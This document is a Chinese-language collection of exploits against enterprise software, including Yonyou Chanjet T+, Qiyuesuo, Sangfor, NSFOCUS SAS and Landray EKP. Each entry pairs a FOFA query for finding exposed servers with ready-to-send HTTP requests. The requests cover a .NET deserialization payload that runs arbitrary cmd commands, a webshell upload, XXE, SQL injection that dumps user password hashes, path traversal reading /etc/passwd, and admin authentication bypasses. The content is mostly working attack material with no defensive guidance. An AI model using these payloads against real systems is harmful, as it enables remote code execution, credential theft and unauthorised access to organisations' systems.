## 这里就是漏洞库了

### 用友畅捷通T
> fofa语法：`app="畅捷通-TPlus"`

#### 畅捷通T+ 反序列化漏洞（QVD-2023-13615）

该漏洞属于.net反序列化场景中的 JavaScriptSerializer反序列化；

简介：在.NET处理 Ajax应用的时候，通常序列化功能由JavaSerializer类提供，它是.NET2.0之后内部实现的序列化功能的类，位于命名空间System.Web..Serialization、通过System.Web.Extensions引用，让开发者轻松实现.Net中所有类型和Json数据之间的转换，但在某些场景下开发者使用Deserialize 或DeserializeObject方法处理不安全的Json数据时会造成反序列化攻击从而实现远程RCE漏洞。

> POC
> ```
> POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
> Host: your-ip
> X-Ajaxpro-Method: GetStoreWarehouseByStore
> 
> {
> "storeID":{}
> }
> ```

- PS:`X-Ajaxpro-Method`：用于指定在Ajax请求中要调用的服务器端方法的名称

![这是一张图片](/images/QVD-2023-13615/1.png)

- 出现这种情况，则存在漏洞  
  使用ysoserial.net工具构造payload（攻击链：ObjectDataProvider）

- `./ysoserial.exe -f JavaScriptSerializer -g ObjectDataProvider -c "执行的命令"`

  ![这是一张图片](/images/QVD-2023-13615/2.png)

- 将生成的序列化数据加载到PoC中（PS：需要将里面的单引号替换成双引号）

  ![这是一张图片](/images/QVD-2023-13615/3.png)

> exp：
> ```
> POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1
> Host: your-ip
> X-Ajaxpro-Method: GetStoreWarehouseByStore
>
> {
> "storeID":{
>     "__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
>     "MethodName":"Start",
>     "ObjectInstance":{
>         "__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
>         "StartInfo": {
>             "__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
>             "FileName":"cmd", "Arguments":"/c 执行的命令"
>         }
>     }
> }
> }
> ```
  ![这是一张图片](/images/QVD-2023-13615/4.png)

  ![Alt text](/images/QVD-2023-13615/5.png)

- [相关链接](https://blog.csdn.net/qq_41904294/article/details/131350965)

------

### 契约锁

> fofa语法：`app="契约锁-电子签署平台"`

#### 契约锁电子签章系统RCE

> POC
> ```
> POST /callback/%2E%2E;/code/upload HTTP/1.1
> Host: ip:port
> User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
> ebp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
> Content-Type: multipart/from-data;
>
> boundary=----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
> ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
> Content-Disposition: from-data; name="type";
>
> TIMETASK
> ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
> Content-Disposition: from-data; name="file"; filename="qys.jpg"
>
> 马儿
>
> ----GokVTLZMRxcJWKfeCvEsYHlszxEANApZseNMGLki
> ```

------

### 深信服 DC数据中心管理系统

> fofa语法：`app="SANGFOR-数据中心"`

#### 深信服数据中心管理系统 XXE漏洞

> POC
> ```
> POST /src/sangforindex HTTP/1.1
> Host: your-ip
> Content-Type: text/xml
> 
> <?xml version="1.0" encoding="utf-8" ?>
> <!DOCTYPE root [
>     <!ENTITY rt SYSTEM "http://dnslog.cn">
> ]>
> <xxx>
> &rt;
> </xxx>
> ```

> 验证

![Alt text](/images/深信服/1.png)

![Alt text](/images/深信服/2.png)

[相关链接](https://blog.csdn.net/qq_41904294/article/details/132310337)

------

### 通达OA

> fofa语法：`app="TDXK-通达OA" && icon_hash="-759108386"`

------

### 广联达OA

> fofa语法：`fid="/yV4r5PdARKT4jaqLjJYqw==" && "/Services/Identification/Server/"`

#### 广联达 LinkworksGetIMDictionarySQL 注入漏洞

> POC
> ```
> POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
> Host: 
> Content-Type: application/x-www-form-urlencoded
> key=1'UNIONALL SELECT top1concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER--
> ```

------

### 深信服应用交付报表系统

- fofa语法：`app="SANGFOR-应用交付报表系统" && fid="iaytNA57019/kADk8Nev7g=="`

> 登录界面
> ![Alt text](/images/深信服/3.png)

### 深信服应用交付报表任意文件读取漏洞

> POC:`/report/download.php?pdf=../../../../../etc/passwd`

![Alt text](/images/深信服/4.png)

[相关链接](https://blog.csdn.net/weixin_44268918/article/details/128964755)

------

### 绿盟SAS安全审计系统/堡垒机

> fofa语法：`title="NSFOCUS&nbsp;SAS[H]" && body="'/needUsbkey.php?username='"`

> 登录界面
![Alt text](/images/绿盟/1.png)

#### 绿盟sas安全审计系统任意文件读取漏洞

> POC:`webconf/GetFile/index?path=…/…/…/…/…/…/…/…/…/…/…/…/…/…/etc/passwd`

![Alt text](/images/绿盟/2.png)

[相关链接](https://blog.csdn.net/holyxp/article/details/132215469)

### 绿盟 SAS堡垒机 local_user.php 任意用户登录漏洞

> POC:`/api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin`

![Alt text](/images/绿盟/3.png)

[相关链接](https://peiqi.wgpsec.org/wiki/webapp/%E7%BB%BF%E7%9B%9F/%E7%BB%BF%E7%9B%9F%20SAS%E5%A0%A1%E5%9E%92%E6%9C%BA%20local_user.php%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html)

------

### 蓝凌OA(EKP)

> fofa语法：`icon_hash="831854882" && "landray.com.cn"`

#### 蓝凌 EKP 远程代码执行漏洞

- 通过文件上传-->解压-->获取 webshell，前台漏洞

> 漏洞路径
> `/api///sys/ui/sys_ui_extend/sysUiExtend.do`

> POC
> ```
> POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
> Host: xxx
> User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36
> Accept: /
> Connection: Keep-Alive
> Content-Length: 42
> Content-Type: application/x-www-form-urlencoded
> var=("body":{"file":"file:///etc/passwd"})
> ```

### 汉得SRM

> fofa语法：`app="汉得SRM云平台(Going-Link)"`

#### 汉得SRM tomcat.jsp 登录绕过漏洞

```

/tomcat.jsp?dataName=role_id&dataValue=1
/tomcat.jsp?dataName=user_id&dataValue=1
```

**然后访问后台：/main.screen**
